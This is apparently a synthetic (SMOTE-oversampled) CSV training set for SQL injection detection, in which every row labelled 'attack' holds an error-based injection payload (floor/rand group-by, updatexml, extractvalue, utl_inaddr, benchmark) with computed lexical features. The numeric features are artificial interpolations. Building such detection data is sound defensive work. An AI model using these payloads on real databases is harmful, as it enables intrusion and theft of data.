id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000026,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000006,0.11810266406361444,254.0,43.52233237927655,4.462916529948476,148.0,2.0,77.0,27.0,0.5826771653543307,0.007874015748031482,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,0.0,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000027,attack,error,"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000240,0.897166561857123,312.6381151633012,39.276230326602445,4.020342961516518,103.0,63.0,113.0,33.63811516330122,0.32945517058019963,0.20151141501507355,0.36144110947148117,0.10759230493324569,0.0,0.6381151633012232,2.0,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,7.0,0.0,0.6381151633012232,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000028,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'lwlh'  =  'lwlh",nearest_attack_euclidean,R000237,0.827543140036563,290.1022412474336,37.47348274982891,3.941203714566317,108.89393099931563,35.0,109.73482749828908,36.47348274982891,0.3754362731440573,0.12072736448336167,0.3780707763302497,0.12576558604233132,4.0,0.0,0.0,0.0,2.0,1.5265172501710922,0.0,20.946965499657814,0.0,2.0,5.0,3.526517250171092,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000029,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000300,0.8535241465513133,290.2993808193764,38.0,3.958941241703434,108.9465015518337,35.0,109.86625387958425,36.486625387958426,0.37536256066942947,0.1206455483117346,0.3782663559405201,0.1257255350783158,4.0,0.0,0.0,0.0,2.0,1.5133746120415748,0.0,20.97325077591685,0.0,2.0,5.0,3.5133746120415745,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000030,attack,error,"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  3872  =  3872",nearest_attack_euclidean,R000281,0.4009308157404356,323.8320590968203,36.0,3.87271786372108,101.0,63.0,125.86004924735023,33.97200984947005,0.31219392062250495,0.1947348217744338,0.3882251692774847,0.10484608832557657,0.0,0.0,0.0,0.0,2.0,2.0,0.0,22.972009849470044,0.0,0.0,6.0,5.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000031,attack,error,"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000072,0.35042750289241986,217.15187546227676,38.85864591037946,3.7647890854831685,63.0,37.0,92.43458364151783,24.717291820758916,0.29014695875620056,0.17040376942824476,0.42564511891680695,0.11380415289874775,0.0,0.8586459103794598,1.0,0.0,1.0,1.0,0.0,16.858645910379458,0.0,0.0,3.0,3.0,0.0,0.8586459103794597,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000032,attack,error,"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000124,1.0018390479103885,341.95461646882404,38.0,3.8111697707018535,103.60615529176543,55.0,141.0,42.34846117705864,0.30291292533023645,0.16085086785289593,0.4123631339501514,0.12387307286671627,0.0,4.0,0.0,0.0,2.0,2.0,0.0,26.0,1.348461177058642,0.0,6.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000033,attack,error,"1 where 2278  =  2278 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000277,0.06442957500236556,274.0,37.039867870407896,4.039994237486353,101.98006606479605,43.0,97.0,32.01993393520395,0.37219002213429214,0.15693430656934307,0.354014598540146,0.11686107275621879,0.019933935203948705,0.0,2.0,0.0,2.0,2.0,0.0,18.0,0.0,2.0,5.0,6.0,0.019933935203948705,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,0.9800660647960512,0.019933935203948705,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000034,attack,error,"1',row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",nearest_attack_euclidean,R000063,1.596261459221823,298.38634801400787,38.0,3.9680756682390688,102.23180880840474,55.0,108.73908528504285,32.41545392056032,0.3421821921312101,0.18463514886436774,0.3644312435727448,0.1087514154316773,1.0,0.0,0.0,0.0,2.0,1.0,0.0,20.415453920560317,0.0,0.0,6.584546079439685,4.0,1.0,-2.7755575615628914e-17,0.0,0.4154539205603156,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,-1.1102230246251565e-16,0.4154539205603155,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.415453920560315
SMOTE_000035,attack,error,"-6170   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000054,0.3244592650773451,217.1523705428795,37.15237054287952,3.7080842334127353,63.0,37.0,93.0,24.152370542879517,0.2901196604193673,0.17038773707169194,0.42827187966668506,0.11122072284225568,0.1523705428795148,0.0,1.0,0.0,1.0,1.0,0.0,17.0,0.0,0.0,3.0,3.0,0.15237054287951468,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000036,attack,error,"1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000078,0.03575603882833098,318.5435735106409,40.0,4.007173540337819,104.0,63.0,116.63485880851272,34.90871470212818,0.3264927056575419,0.19777923515793405,0.366141423828151,0.109586635356373,1.0,0.0,2.0,0.0,2.0,2.0,0.0,20.908714702128183,0.0,0.0,6.0,7.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000037,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000296,0.6252145548297996,250.66535225426975,35.58366193643256,3.988520221701376,95.24901419070231,35.0,89.83267612713487,30.58366193643256,0.37996192551365177,0.13963700924013142,0.3583681763421524,0.1220328889040644,1.0,0.0,0.0,0.0,2.0,1.0,0.0,18.0,0.0,2.0,5.583661936432561,3.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.41633806356743885,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.416338063567439
SMOTE_000038,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000291,0.43624433837893656,280.16390848975914,37.665090565576634,4.017020310081925,102.83136320697079,43.0,101.33254528278832,33.0,0.36701044776285713,0.15349464790511014,0.361696686172297,0.1177982181597357,0.0,0.0,2.0,0.0,2.0,2.0,0.0,19.0,0.0,2.0,5.0,6.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,0.8337273586058412,0.16627264139415882,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000039,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'lwlh'  =  'lwlh",nearest_attack_euclidean,R000237,0.6370179358075707,287.0680646316616,37.23929791950951,3.98027920281747,107.95719167803803,36.914383356076065,105.71789375852852,36.478595839019015,0.37615550446757323,0.12837913106786064,0.3683865388379164,0.12707882562664974,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,0.0,2.0,5.0,4.478595839019016,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.239297919509508,0.0,0.23929791950950813,2.0,0.760702080490492,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.239297919509507
SMOTE_000040,attack,error,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",nearest_attack_euclidean,R000152,0.2816008634821745,196.013108899408,32.6986891100592,3.7285113825630303,59.0,32.0,79.41048711952641,25.602621779881602,0.30116201472561643,0.1633421096816903,0.4049162722074116,0.13057960338528163,0.0,4.0,0.0,0.0,1.0,1.0,0.0,14.6026217798816,0.0,0.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000041,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000213,1.0984195331655102,316.5924622576636,37.0,3.8876676920326276,100.82803301840454,59.87475471574545,122.84295282617272,33.04672169734091,0.31954948603084554,0.18911662382083555,0.3870149098670449,0.10431898028127401,0.0,0.0,0.0,0.0,2.0,1.6093443394681817,0.0,22.437377357872727,0.0,0.0,6.0,4.609344339468182,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.6093443394681817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.609344339468182
SMOTE_000042,attack,error,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",nearest_attack_euclidean,R000155,0.4417287175865954,271.37878200594207,36.14690356547574,3.9708729676323427,99.85309643452426,35.0,99.93807130951484,36.58761426190297,0.36829706677768753,0.12908066150936076,0.36783429830709335,0.13478797340585835,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.587614261902967,2.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.853096434524258,0.14690356547574202,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000043,attack,error,"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'wzdo'  =  'wzdo",nearest_attack_euclidean,R000087,0.23918528401937542,305.176115711173,36.43522314223459,3.8350370048868183,108.0,35.0,122.74089256893838,39.43522314223459,0.35397214659628384,0.11471319565620311,0.4021090870667698,0.12920557068074323,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.435223142234594,0.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000044,attack,error,"1%'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000113,0.20343154005190098,188.0,27.0,3.4159745043723366,36.675569868294055,38.09924017560793,83.45037991219604,29.774810043901983,0.1950828184483726,0.20265553284897833,0.4438849995329576,0.1583766491696914,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,2.0,0.0,5.774810043901982,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000045,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000156,1.9105699210784084,345.4048993287024,35.20244966435119,3.653777380054718,93.01837248263394,48.398775167824404,143.19020134259523,60.79755033564881,0.2691902287657845,0.14013442850805619,0.4146353497270416,0.17603999299911777,0.0,4.0,0.6012248321755953,0.0,0.0,3.0,0.0,28.797550335648808,0.7975503356488094,1.803674496526786,0.3987751678244047,23.601224832175596,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.3987751678244047,0.6012248321755953,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000046,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,nearest_attack_euclidean,R000282,0.5102084169857061,344.43528125925945,31.777411250370378,3.5493605221807294,91.33223375111113,51.21929000296302,145.32893500444453,56.554822500740755,0.265303173072853,0.1485422557740335,0.4218787307708588,0.16427584038225473,0.0,0.0,0.0,0.0,0.0,2.777411250370378,0.0,29.777411250370378,0.0,3.0,0.0,22.777411250370378,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.777411250370378,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.777411250370378
SMOTE_000047,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",nearest_attack_euclidean,R000205,1.125480026659257,200.13068507995064,31.102789552722783,3.9169097511982054,74.27092164542088,37.0,68.20557910544557,20.654184329084178,0.37016991018395096,0.18543983414492976,0.341287326660259,0.10310292901086027,2.6541843290841767,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,1.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.551394776361392,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.551394776361393
SMOTE_000048,attack,error,"1 where 7932  =  7932 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000145,0.6674144954479956,192.80777897986934,31.602592993289782,3.6270795275700802,48.0,40.0,80.20518598657956,24.602592993289782,0.2490027535803086,0.20750229465025716,0.41593472729760594,0.12756022447182833,0.301296496644891,0.0,2.0,0.0,1.0,2.0,0.0,14.301296496644891,0.0,0.0,4.0,5.0,0.3012964966448912,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000049,attack,error,"1  )   as qjjm where 3850  =  3850 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000053,0.2928518929290011,281.75969944731537,40.02146910322662,4.060649208215535,105.04293820645324,43.0,101.04293820645324,32.673823034408876,0.3727681611488881,0.15268491667006634,0.35856491308655636,0.11598200909448925,0.0,0.0,2.0,0.0,2.0,2.0,0.0,18.673823034408873,0.0,2.0,5.0,6.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000050,attack,error,"-2298%' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000035,0.45604350554395584,203.09450010100616,40.45274994949692,3.9265656232828885,63.0,37.0,80.09450010100616,23.0,0.31022412990571496,0.18219512391288023,0.3943243178031279,0.1132564283782769,1.0,0.0,1.0,0.0,1.0,1.0,0.0,14.273625025251539,0.7263749747484612,0.0,3.0,3.0,1.0,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000051,attack,error,"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",nearest_attack_euclidean,R000051,0.5017439502423706,190.53857095842264,35.56914323326188,3.8712047122071356,62.70742969978566,32.0,72.83114125863699,23.0,0.3292832146186296,0.1679558901303772,0.3820425992197846,0.12071829603120862,1.784571616630943,0.0,0.0,0.0,0.0,1.0,0.0,14.430856766738113,0.0,0.0,4.0,2.784571616630943,0.8922858083154717,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8922858083154714,0.0,0.8922858083154717,1.1102230246251565e-16,0.10771419168452834,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8922858083154717
